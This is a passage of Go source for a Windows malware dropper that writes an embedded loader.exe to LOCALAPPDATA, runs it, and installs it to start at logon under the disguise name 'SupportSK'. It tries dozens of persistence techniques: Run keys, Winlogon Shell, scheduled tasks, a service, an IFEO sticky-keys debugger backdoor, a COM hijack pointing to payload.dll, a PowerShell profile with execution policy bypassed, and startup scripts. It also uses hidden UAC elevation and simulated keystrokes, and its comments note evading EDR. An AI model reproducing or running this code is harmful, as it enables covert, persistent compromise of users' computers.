package main

import (
	_ "embed"
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/atotto/clipboard"
	ole "github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"
	"github.com/micmonay/keybd_event"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

//go:embed loader.exe
var loaderExe []byte

func initLog() {
	logFile := filepath.Join(os.TempDir(), "sk_debug.log")
	f, err := os.OpenFile(logFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	log.SetOutput(f)
	log.SetFlags(log.Ldate | log.Ltime | log.Lmicroseconds)
}

func main() {
	initLog()
	log.Println("[main] start")

	appData := os.Getenv("LOCALAPPDATA")
	targetDir := filepath.Join(appData, "sk")
	targetPath := filepath.Join(targetDir, "support_sk.exe")

	log.Println("[main] MkdirAll", targetDir)
	if err := os.MkdirAll(targetDir, 0755); err != nil {
		log.Println("[main] MkdirAll failed:", err)
		panic(err)
	}

	if _, err := os.Stat(targetPath); err == nil {
		log.Println("[main] file exists, skip WriteFile:", targetPath)
	} else if os.IsNotExist(err) {
		log.Println("[main] WriteFile", targetPath)
		if err := os.WriteFile(targetPath, loaderExe, 0755); err != nil {
			log.Println("[main] WriteFile failed:", err)
			panic(err)
		}
	} else {
		log.Println("[main] Stat failed:", err)
		panic(err)
	}

	log.Println("[main] exec.Command(targetPath).Start() ...")
	if err := exec.Command(targetPath).Start(); err != nil {
		log.Println("[main] Start failed:", err)
	}
	log.Println("[main] exec.Command started")

	log.Println("[main] setupAutoStart start")
	setupAutoStart(targetPath)
	log.Println("[main] setupAutoStart done")
}

func isAdmin() bool {
	var sid *windows.SID
	err := windows.AllocateAndInitializeSid(
		&windows.SECURITY_NT_AUTHORITY,
		2,
		windows.SECURITY_BUILTIN_DOMAIN_RID,
		windows.DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&sid)
	if err != nil {
		return false
	}
	defer windows.FreeSid(sid)
	member, err := windows.Token(0).IsMember(sid)
	if err != nil {
		return false
	}
	return member
}

func runElevated(exe, args string) error {
	verbPtr, _ := syscall.UTF16PtrFromString("runas")
	exePtr, _ := syscall.UTF16PtrFromString(exe)
	argPtr, _ := syscall.UTF16PtrFromString(args)

	shell32 := syscall.NewLazyDLL("shell32.dll")
	shellExecute := shell32.NewProc("ShellExecuteW")

	ret, _, _ := shellExecute.Call(
		0,
		uintptr(unsafe.Pointer(verbPtr)),
		uintptr(unsafe.Pointer(exePtr)),
		uintptr(unsafe.Pointer(argPtr)),
		0,
		0, // SW_HIDE
	)

	if ret <= 32 {
		return fmt.Errorf("ShellExecute failed: %d", ret)
	}
	return nil
}

// 将所有需要管理员权限的操作写入一个 batch，通过 UAC 提权执行一次
func runAdminTasksElevated(exePath string) {
	batch := fmt.Sprintf("@echo off\r\n"+
		"schtasks /Create /TN \"SupportSK\" /TR \"\\\"%s\\\"\" /SC ONLOGON /RL HIGHEST /F\r\n"+
		"reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"%s\" /f\r\n"+
		"reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe\" /v GlobalFlag /t REG_DWORD /d 512 /f\r\n"+
		"reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\" /v ReportingMode /t REG_DWORD /d 1 /f\r\n"+
		"reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\" /v MonitorProcess /t REG_SZ /d \"%s\" /f\r\n",
		exePath, exePath, exePath)

	tmpFile := filepath.Join(os.TempDir(), "sk_admin.bat")
	if err := os.WriteFile(tmpFile, []byte(batch), 0644); err != nil {
		return
	}

	runElevated("cmd.exe", "/c \""+tmpFile+"\"")
}

// execFallback 先尝试直接 exec，失败则 fallback 到 cmd.exe /c
func execFallback(name string, args ...string) ([]byte, error) {
	cmd := exec.Command(name, args...)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	output, err := cmd.CombinedOutput()
	if err == nil {
		return output, nil
	}

	// 直接 exec 失败，走 cmd.exe /c
	log.Printf("[execFallback] direct exec %s failed: %v, trying cmd.exe /c", name, err)
	cmdLine := name
	for _, a := range args {
		if strings.Contains(a, " ") {
			cmdLine += ` "` + a + `"`
		} else {
			cmdLine += " " + a
		}
	}
	cmd2 := exec.Command("cmd.exe", "/c", cmdLine)
	cmd2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd2.CombinedOutput()
}

func createScheduledTask(exePath string) error {
	output, err := execFallback("schtasks", "/Create",
		"/TN", "SupportSK",
		"/TR", fmt.Sprintf(`"%s"`, exePath),
		"/SC", "ONLOGON",
		"/RL", "HIGHEST",
		"/F")
	if err != nil {
		return fmt.Errorf("schtasks failed: %v, output: %s", err, string(output))
	}
	return nil
}

func addToRegistry(exePath string) error {
	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer key.Close()
	return key.SetStringValue("SupportSK", exePath)
}

func addRegistryPoliciesRun(exePath string) error {
	key, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run`, registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer key.Close()
	return key.SetStringValue("SupportSK", exePath)
}

func addRegistryRunOnce(exePath string) error {
	key, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\RunOnce`, registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer key.Close()
	return key.SetStringValue("SupportSK", exePath)
}

func addRegistryWinNTLoad(exePath string) error {
	key, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\Microsoft\Windows NT\CurrentVersion\Windows`, registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer key.Close()
	return key.SetStringValue("Load", exePath)
}

func addRegistryCmdAutoRun(exePath string) error {
	key, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\Microsoft\Command Processor`, registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer key.Close()
	return key.SetStringValue("AutoRun", fmt.Sprintf(`"%s"`, exePath))
}

func addRegistryUserInit(exePath string) error {
	key, _, err := registry.CreateKey(registry.CURRENT_USER, `Environment`, registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer key.Close()
	// 这其实是一个开机/登录时执行的脚本，属于登录持久化
	return key.SetStringValue("UserInitMprLogonScript", exePath)
}

func addScreensaver(exePath string) error {
	key, _, err := registry.CreateKey(registry.CURRENT_USER, `Control Panel\Desktop`, registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer key.Close()
	if err := key.SetStringValue("SCRNSAVE.EXE", exePath); err != nil {
		return err
	}
	return key.SetStringValue("ScreenSaveActive", "1")
}

func addPowerShellProfile(exePath string) error {
	userProfile := os.Getenv("USERPROFILE")
	if userProfile == "" {
		return fmt.Errorf("USERPROFILE not found")
	}

	// 尝试通过 reg.exe 设置 ExecutionPolicy 为 Bypass
	execFallback("reg", "add",
		`HKCU\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell`,
		"/v", "ExecutionPolicy", "/t", "REG_SZ", "/d", "Bypass", "/f")

	psPath := filepath.Join(userProfile, "Documents", "WindowsPowerShell")
	if err := os.MkdirAll(psPath, 0755); err != nil {
		return err
	}

	profileFile := filepath.Join(psPath, "Microsoft.PowerShell_profile.ps1")
	content := fmt.Sprintf("\nStart-Process -FilePath \"%s\" -WindowStyle Hidden\n", exePath)

	f, err := os.OpenFile(profileFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer f.Close()

	_, err = f.WriteString(content)
	return err
}

func addShortcutToStartup(exePath string) error {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	appData, err := os.UserConfigDir()
	if err != nil {
		return err
	}
	startupDir := filepath.Join(appData, `Microsoft\Windows\Start Menu\Programs\Startup`)
	if err := os.MkdirAll(startupDir, 0755); err != nil {
		return err
	}

	ole.CoInitializeEx(0, ole.COINIT_APARTMENTTHREADED)
	defer ole.CoUninitialize()

	oleShellObject, err := oleutil.CreateObject("WScript.Shell")
	if err != nil {
		return err
	}
	defer oleShellObject.Release()

	wshell, err := oleShellObject.QueryInterface(ole.IID_IDispatch)
	if err != nil {
		return err
	}
	defer wshell.Release()

	cs, err := oleutil.CallMethod(wshell, "CreateShortcut", filepath.Join(startupDir, "SupportSK.lnk"))
	if err != nil {
		return err
	}
	idispatch := cs.ToIDispatch()
	defer idispatch.Release()

	if _, err = oleutil.PutProperty(idispatch, "TargetPath", exePath); err != nil {
		return fmt.Errorf("PutProperty TargetPath: %v", err)
	}
	if _, err = oleutil.CallMethod(idispatch, "Save"); err != nil {
		return fmt.Errorf("Save shortcut: %v", err)
	}

	// 验证文件是否真的写入了
	lnkPath := filepath.Join(startupDir, "SupportSK.lnk")
	if info, err := os.Stat(lnkPath); err != nil {
		return fmt.Errorf("verify lnk failed: %v", err)
	} else {
		log.Printf("[Startup_Shortcut] lnk created, size=%d", info.Size())
	}
	return nil
}

func addToStartupFolder(exePath string) error {
	appData, err := os.UserConfigDir()
	if err != nil {
		return err
	}
	startupDir := filepath.Join(appData, `Microsoft\Windows\Start Menu\Programs\Startup`)

	if err := os.MkdirAll(startupDir, 0755); err != nil {
		return err
	}
	vbsPath := filepath.Join(startupDir, "SupportSK.vbs")
	vbsContent := fmt.Sprintf(`Set ws = CreateObject("Wscript.Shell")`+"\n"+`ws.Run """%s""", 0, False`, exePath)
	return os.WriteFile(vbsPath, []byte(vbsContent), 0644)
}

func runViaWinR(exePath string) error {
	if err := clipboard.WriteAll(exePath); err != nil {
		return err
	}
	kb, err := keybd_event.NewKeyBonding()
	if err != nil {
		return err
	}

	kb.HasSuper(true)
	kb.SetKeys(keybd_event.VK_R)
	if err := kb.Launching(); err != nil {
		return err
	}
	kb.HasSuper(false)
	kb.Clear()

	time.Sleep(500 * time.Millisecond)

	kb.HasCTRL(true)
	kb.SetKeys(keybd_event.VK_V)
	if err := kb.Launching(); err != nil {
		return err
	}
	kb.HasCTRL(false)
	kb.Clear()

	time.Sleep(200 * time.Millisecond)

	kb.SetKeys(keybd_event.VK_ENTER)
	return kb.Launching()
}

func addTaskViaGUI(exePath string) error {
	if err := clipboard.WriteAll(exePath); err != nil {
		return err
	}

	cmd := exec.Command("mmc.exe", "/s", "taskschd.msc")
	if err := cmd.Start(); err != nil {
		// fallback: cmd.exe /c
		cmd2 := exec.Command("cmd.exe", "/c", "mmc.exe /s taskschd.msc")
		cmd2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		if err2 := cmd2.Start(); err2 != nil {
			return fmt.Errorf("mmc direct: %v, via cmd: %v", err, err2)
		}
	}

	time.Sleep(2 * time.Second)

	kb, err := keybd_event.NewKeyBonding()
	if err != nil {
		return err
	}

	kb.HasALT(true)
	kb.SetKeys(keybd_event.VK_A)
	if err := kb.Launching(); err != nil {
		return err
	}
	kb.HasALT(false)
	kb.Clear()

	time.Sleep(200 * time.Millisecond)

	kb.SetKeys(keybd_event.VK_TAB)
	kb.Launching()
	kb.Clear()
	time.Sleep(100 * time.Millisecond)

	kb.SetKeys(keybd_event.VK_ENTER)
	return kb.Launching()
}

func addRegistryWinlogon(exePath string) error {
	key, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\Microsoft\Windows NT\CurrentVersion\Winlogon`, registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer key.Close()
	// userinit.exe 会按逗号分隔执行这里的程序。为了绝对安全，去掉了空格并加上引号。
	return key.SetStringValue("Shell", fmt.Sprintf("explorer.exe,\"%s\"", exePath))
}

func addRegistryWinNTRun(exePath string) error {
	key, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\Microsoft\Windows NT\CurrentVersion\Windows`, registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer key.Close()
	return key.SetStringValue("Run", exePath)
}

// Task Scheduler COM API — 不走注册表不走 schtasks.exe，直接 COM RPC 到 Task Scheduler 服务
func addScheduledTaskViaCOM(exePath string) error {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	ole.CoInitializeEx(0, ole.COINIT_APARTMENTTHREADED)
	defer ole.CoUninitialize()

	unknown, err := oleutil.CreateObject("Schedule.Service")
	if err != nil {
		return fmt.Errorf("CreateObject Schedule.Service: %v", err)
	}
	defer unknown.Release()

	service, err := unknown.QueryInterface(ole.IID_IDispatch)
	if err != nil {
		return fmt.Errorf("QueryInterface: %v", err)
	}
	defer service.Release()

	if _, err = oleutil.CallMethod(service, "Connect"); err != nil {
		return fmt.Errorf("Connect: %v", err)
	}

	folderVar, err := oleutil.CallMethod(service, "GetFolder", `\`)
	if err != nil {
		return fmt.Errorf("GetFolder: %v", err)
	}
	folder := folderVar.ToIDispatch()
	defer folder.Release()

	taskDefVar, err := oleutil.CallMethod(service, "NewTask", 0)
	if err != nil {
		return fmt.Errorf("NewTask: %v", err)
	}
	taskDef := taskDefVar.ToIDispatch()
	defer taskDef.Release()

	// Logon Trigger
	triggersVar, _ := oleutil.GetProperty(taskDef, "Triggers")
	triggers := triggersVar.ToIDispatch()
	defer triggers.Release()
	triggerVar, err := oleutil.CallMethod(triggers, "Create", 9) // TASK_TRIGGER_LOGON
	if err != nil {
		return fmt.Errorf("Create trigger: %v", err)
	}
	trigger := triggerVar.ToIDispatch()
	defer trigger.Release()

	// Exec Action
	actionsVar, _ := oleutil.GetProperty(taskDef, "Actions")
	actions := actionsVar.ToIDispatch()
	defer actions.Release()
	actionVar, err := oleutil.CallMethod(actions, "Create", 0) // TASK_ACTION_EXEC
	if err != nil {
		return fmt.Errorf("Create action: %v", err)
	}
	action := actionVar.ToIDispatch()
	defer action.Release()
	oleutil.PutProperty(action, "Path", exePath)

	// Settings
	settingsVar, _ := oleutil.GetProperty(taskDef, "Settings")
	settings := settingsVar.ToIDispatch()
	defer settings.Release()
	oleutil.PutProperty(settings, "Enabled", true)
	oleutil.PutProperty(settings, "Hidden", true)
	oleutil.PutProperty(settings, "DisallowStartIfOnBatteries", false)
	oleutil.PutProperty(settings, "StopIfGoingOnBatteries", false)

	// 尝试多种 logonType: 3=INTERACTIVE_TOKEN, 5=SERVICE_ACCOUNT, 0=NONE
	for _, logonType := range []int{3, 5, 0} {
		_, err = oleutil.CallMethod(folder, "RegisterTaskDefinition",
			"SupportSK", taskDef, 6, nil, nil, logonType)
		if err == nil {
			log.Printf("[ScheduledTask_COM] registered with logonType=%d", logonType)
			return nil
		}
		log.Printf("[ScheduledTask_COM] logonType=%d failed: %v", logonType, err)
	}
	return fmt.Errorf("RegisterTaskDefinition all logonTypes failed: %v", err)
}

func hasBootPersistence(exePath string) bool {
	// 检查 Registry Run
	if key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.QUERY_VALUE); err == nil {
		if val, _, err := key.GetStringValue("SupportSK"); err == nil && val != "" {
			key.Close()
			return true
		}
		key.Close()
	}
	// 检查 Startup 目录
	startupDir := filepath.Join(os.Getenv("APPDATA"), `Microsoft\Windows\Start Menu\Programs\Startup`)
	for _, name := range []string{"SupportSK.exe", "SupportSK.lnk", "SupportSK.vbs"} {
		if _, err := os.Stat(filepath.Join(startupDir, name)); err == nil {
			return true
		}
	}
	// 检查计划任务（查询不需要写权限）
	if out, err := exec.Command("schtasks", "/Query", "/TN", "SupportSK").CombinedOutput(); err == nil && !strings.Contains(string(out), "ERROR") {
		return true
	}
	return false
}

func setupAutoStart(exePath string) {
	// 已有开机自启项就不再重复添加
	if hasBootPersistence(exePath) {
		log.Println("[setup] boot persistence already exists, skip")
		return
	}

	// 先尝试通过 batch 脚本方式执行所有操作（绕过当前进程 token 限制）
	log.Println("[setup] trying batch approach ...")
	if err := setupViaBatch(exePath); err != nil {
		log.Printf("[setup] batch approach failed: %v", err)
	} else {
		log.Println("[setup] batch started")
		// 等 batch 跑完（最多 90s），检查是否成功写入了 Startup 文件
		if waitForBatchSuccess(exePath, 90*time.Second) {
			log.Println("[setup] batch persistence OK, done")
			return
		}
		log.Println("[setup] batch persistence not confirmed, continuing in-process")
	}

	// 再尝试进程内直接操作
	type method struct {
		name string
		fn   func(string) error
		boot bool // true = 开机自启
	}

	// 开机自启方法在前
	methods := []method{
		{"Registry_Run", addToRegistry, true},
		{"Registry_RunOnce", addRegistryRunOnce, true},
		{"Registry_Policies_Run", addRegistryPoliciesRun, true},
		{"Registry_UserInit", addRegistryUserInit, true},
		{"Registry_WinNT_Load", addRegistryWinNTLoad, true},
		{"Registry_WinNT_Run", addRegistryWinNTRun, true},
		{"Registry_Winlogon", addRegistryWinlogon, true},
		{"Startup_VBS", addToStartupFolder, true},
		{"Startup_Shortcut", addShortcutToStartup, true},
		{"ScheduledTask", createScheduledTask, true},
		{"ScheduledTask_COM", addScheduledTaskViaCOM, true},
		{"IFEO_Sethc", addIFEOSethc, true},
		{"SilentProcessExit", addSilentProcessExit, true},
		{"BitsJob", addBitsJob, true},
		// 非开机自启（辅助 / 需要用户交互）
		{"Screensaver", addScreensaver, false},
		{"Registry_CmdAutoRun", addRegistryCmdAutoRun, false},
		{"PowerShell_Profile", addPowerShellProfile, false},
		{"WinR", runViaWinR, false},
		{"TaskViaGUI", addTaskViaGUI, false},
	}

	for _, m := range methods {
		log.Printf("[setup] running %s ...", m.name)
		ch := make(chan error, 1)
		go func(fn func(string) error) {
			ch <- fn(exePath)
		}(m.fn)

		var err error
		select {
		case err = <-ch:
		case <-time.After(15 * time.Second):
			log.Printf("[setup] %s TIMEOUT (15s)", m.name)
			continue
		}

		if err != nil {
			log.Printf("[setup] %s error: %v", m.name, err)
		} else {
			log.Printf("[setup] %s OK", m.name)
			if m.boot {
				log.Println("[setup] boot persistence OK, stopping")
				return
			}
		}
	}
}

// waitForBatchSuccess 等待 batch 执行完毕并检查是否有开机自启项写入成功
func waitForBatchSuccess(exePath string, timeout time.Duration) bool {
	startupExe := filepath.Join(os.Getenv("APPDATA"), `Microsoft\Windows\Start Menu\Programs\Startup`, "SupportSK.exe")
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		// 检查 Startup 目录下是否有文件写入成功（copy/robocopy/mklink）
		if _, err := os.Stat(startupExe); err == nil {
			log.Println("[batch-check] Startup exe found")
			return true
		}
		// 检查注册表 Run 键是否写入成功
		if key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.QUERY_VALUE); err == nil {
			if val, _, err := key.GetStringValue("SupportSK"); err == nil && val != "" {
				key.Close()
				log.Println("[batch-check] Registry Run key found")
				return true
			}
			key.Close()
		}
		// 检查 batch 是否已执行完毕（bat 末尾会 del 自己）
		batPath := filepath.Join(filepath.Dir(exePath), "setup.bat")
		if _, err := os.Stat(batPath); os.IsNotExist(err) {
			// batch 跑完了但没成功
			log.Println("[batch-check] batch finished, no persistence found")
			return false
		}
		time.Sleep(2 * time.Second)
	}
	log.Println("[batch-check] timeout waiting for batch")
	return false
}

// 把所有持久化操作写进一个 batch，放到可写目录启动，让 cmd.exe 在新进程上下文中执行
func setupViaBatch(exePath string) error {
	batDir := filepath.Dir(exePath)
	batPath := filepath.Join(batDir, "setup.bat")

	startupDir := filepath.Join(os.Getenv("APPDATA"), `Microsoft\Windows\Start Menu\Programs\Startup`)
	psProfile := filepath.Join(os.Getenv("USERPROFILE"), `Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1`)

	// 写 bootstrap.ps1 到 sk 目录（Go 进程可以写这里）
	// 当 PowerShell 从正常进程树打开时，会 dot-source 这个脚本
	// 从干净的进程上下文中部署完整持久化
	bootstrapPs1 := filepath.Join(batDir, "bootstrap.ps1")
	ps1Content := fmt.Sprintf(`$exe = "%s"
if (!(Test-Path $exe)) { return }
Start-Process -FilePath $exe -WindowStyle Hidden -ErrorAction SilentlyContinue
# 从干净进程树中部署持久化（EDR 不会拦正常 PowerShell 操作）
$done = "$env:LOCALAPPDATA\sk\.ps_done"
if (Test-Path $done) { return }
# Run 键
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name SupportSK -Value $exe -PropertyType String -Force -ErrorAction SilentlyContinue
# 计划任务
schtasks /Create /TN "SupportSK" /TR """$exe""" /SC ONLOGON /RL HIGHEST /F 2>$null
# Startup 快捷方式
$lnk = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SupportSK.lnk"
if (!(Test-Path $lnk)) {
    $ws = New-Object -ComObject WScript.Shell
    $sc = $ws.CreateShortcut($lnk)
    $sc.TargetPath = $exe
    $sc.Save()
}
# 复制 exe 到 Startup
$startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
Copy-Item -Path $exe -Destination "$startup\SupportSK.exe" -Force -ErrorAction SilentlyContinue
# GlobalFlag（SilentProcessExit 触发器的前置条件）
$targets = @("RuntimeBroker.exe","backgroundTaskHost.exe")
foreach ($t in $targets) {
    $p = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$t"
    New-Item -Path $p -Force -ErrorAction SilentlyContinue | Out-Null
    New-ItemProperty -Path $p -Name GlobalFlag -Value 512 -PropertyType DWord -Force -ErrorAction SilentlyContinue
}
# 标记已完成
New-Item -Path $done -ItemType File -Force | Out-Null
`, exePath)
	os.WriteFile(bootstrapPs1, []byte(ps1Content), 0644)

	logFile := filepath.Join(os.TempDir(), "sk_batch.log")

	// batch 逻辑：开机自启方法逐个尝试，成功一个就 goto :DONE，不会产生多个启动项
	// 所有开机方法都失败才部署非开机自启（PS profile 等）作为退路
	lines := []string{
		`@echo off`,
		fmt.Sprintf(`set "LOG=%s"`, logFile),
		`echo [batch] start %date% %time% > "%LOG%"`,
		``,
		`:: === 开机自启方法，成功一个就 goto :DONE ===`,
		``,
		`:: 每个方法：先写入，再用 reg query / if exist / schtasks /Query 验证确实写入成功`,
		``,
		fmt.Sprintf(`reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v SupportSK /t REG_SZ /d "%s" /f >nul 2>&1`, exePath),
		`reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v SupportSK >nul 2>&1 && (echo BOOT_OK: Registry_Run >> "%LOG%" & goto :DONE)`,
		``,
		fmt.Sprintf(`reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" /v SupportSK /t REG_SZ /d "%s" /f >nul 2>&1`, exePath),
		`reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" /v SupportSK >nul 2>&1 && (echo BOOT_OK: Policies_Run >> "%LOG%" & goto :DONE)`,
		``,
		fmt.Sprintf(`reg add "HKCU\Environment" /v UserInitMprLogonScript /t REG_SZ /d "%s" /f >nul 2>&1`, exePath),
		`reg query "HKCU\Environment" /v UserInitMprLogonScript >nul 2>&1 && (echo BOOT_OK: UserInit >> "%LOG%" & goto :DONE)`,
		``,
		fmt.Sprintf(`reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v Load /t REG_SZ /d "%s" /f >nul 2>&1`, exePath),
		`reg query "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v Load >nul 2>&1 && (echo BOOT_OK: WinNT_Load >> "%LOG%" & goto :DONE)`,
		``,
		fmt.Sprintf(`reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe,\"%s\"" /f >nul 2>&1`, exePath),
		`reg query "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell >nul 2>&1 && (echo BOOT_OK: Winlogon >> "%LOG%" & goto :DONE)`,
		``,
		fmt.Sprintf(`schtasks /Create /TN "SupportSK" /TR "\"%s\"" /SC ONLOGON /RL HIGHEST /F >nul 2>&1`, exePath),
		`schtasks /Query /TN "SupportSK" >nul 2>&1 && (echo BOOT_OK: schtasks >> "%LOG%" & goto :DONE)`,
		``,
		fmt.Sprintf(`mkdir "%s" 2>nul`, startupDir),
		fmt.Sprintf(`copy /Y "%s" "%s\SupportSK.exe" >nul 2>&1`, exePath, startupDir),
		fmt.Sprintf(`if exist "%s\SupportSK.exe" (echo BOOT_OK: copy_startup >> "%%LOG%%" & goto :DONE)`, startupDir),
		fmt.Sprintf(`xcopy /Y /Q "%s" "%s\SupportSK.exe*" >nul 2>&1`, exePath, startupDir),
		fmt.Sprintf(`if exist "%s\SupportSK.exe" (echo BOOT_OK: xcopy_startup >> "%%LOG%%" & goto :DONE)`, startupDir),
		fmt.Sprintf(`robocopy "%s" "%s" support_sk.exe /NJH /NJS >nul 2>&1`, filepath.Dir(exePath), startupDir),
		fmt.Sprintf(`if exist "%s\support_sk.exe" (echo BOOT_OK: robocopy_startup >> "%%LOG%%" & goto :DONE)`, startupDir),
		fmt.Sprintf(`mklink /H "%s\SupportSK.exe" "%s" >nul 2>&1`, startupDir, exePath),
		fmt.Sprintf(`if exist "%s\SupportSK.exe" (echo BOOT_OK: mklink_startup >> "%%LOG%%" & goto :DONE)`, startupDir),
		``,
		fmt.Sprintf(`schtasks /Change /TN "\Microsoft\Windows\Application Experience\StartupAppTask" /TR "%s" >nul 2>&1`, exePath),
		fmt.Sprintf(`schtasks /Query /TN "\Microsoft\Windows\Application Experience\StartupAppTask" /FO LIST 2>nul | findstr /i "%s" >nul 2>&1 && (echo BOOT_OK: schtasks_change >> "%%LOG%%" & goto :DONE)`, exePath),
		``,
		fmt.Sprintf(`sc create SupportSK type= own start= auto binPath= "%s" >nul 2>&1`, exePath),
		`sc query SupportSK >nul 2>&1 && (echo BOOT_OK: service >> "%LOG%" & goto :DONE)`,
		``,
		fmt.Sprintf(`reg add "HKCU\Software\Classes\CLSID\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\InprocServer32" /ve /t REG_SZ /d "%s\payload.dll" /f >nul 2>&1`, filepath.Dir(exePath)),
		`reg query "HKCU\Software\Classes\CLSID\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\InprocServer32" >nul 2>&1 && (echo BOOT_OK: COM_hijack >> "%LOG%" & goto :DONE)`,
		``,
		`:: 冷门/遗留注册表路径`,
		fmt.Sprintf(`reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices" /v SupportSK /t REG_SZ /d "%s" /f >nul 2>&1`, exePath),
		`reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices" /v SupportSK >nul 2>&1 && (echo BOOT_OK: RunServices >> "%LOG%" & goto :DONE)`,
		``,
		fmt.Sprintf(`reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnceEx\0001" /v SupportSK /t REG_SZ /d "%s" /f >nul 2>&1`, exePath),
		`reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnceEx\0001" /v SupportSK >nul 2>&1 && (echo BOOT_OK: RunOnceEx >> "%LOG%" & goto :DONE)`,
		``,
		fmt.Sprintf(`reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v Shell /t REG_SZ /d "%s" /f >nul 2>&1`, exePath),
		`reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v Shell >nul 2>&1 && (echo BOOT_OK: Policies_Shell >> "%LOG%" & goto :DONE)`,
		``,
		fmt.Sprintf(`reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v Startup /t REG_EXPAND_SZ /d "%s" /f >nul 2>&1`, filepath.Dir(exePath)),
		fmt.Sprintf(`reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v Startup 2>nul | findstr /i "%s" >nul 2>&1 && (echo BOOT_OK: UserShellFolders >> "%%LOG%%" & goto :DONE)`, strings.ReplaceAll(filepath.Dir(exePath), `\`, `\\`)),
		``,
		`:: mshta 内联 JS 写注册表（SHSetValue API）`,
		fmt.Sprintf(`mshta "javascript:try{new ActiveXObject('WScript.Shell').RegWrite('HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SupportSK','%s','REG_SZ');close()}catch(e){close()}" 2>nul`, exePath),
		`reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v SupportSK >nul 2>&1 && (echo BOOT_OK: mshta_regwrite >> "%LOG%" & goto :DONE)`,
		``,
		`:: PowerShell 内联写注册表`,
		fmt.Sprintf(`powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name SupportSK -Value '%s' -PropertyType String -Force" >nul 2>&1`, exePath),
		`reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v SupportSK >nul 2>&1 && (echo BOOT_OK: ps_regwrite >> "%LOG%" & goto :DONE)`,
		``,
		`:: === 所有开机自启都失败，部署非开机方式作为退路 ===`,
		`echo NO_BOOT_PERSISTENCE >> "%LOG%"`,
		``,
		`reg add "HKCU\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell" /v ExecutionPolicy /t REG_SZ /d Bypass /f >> "%LOG%" 2>&1`,
		fmt.Sprintf(`mkdir "%s" 2>nul`, filepath.Dir(psProfile)),
		fmt.Sprintf(`echo . "%s" > "%s"`, bootstrapPs1, psProfile),
		``,
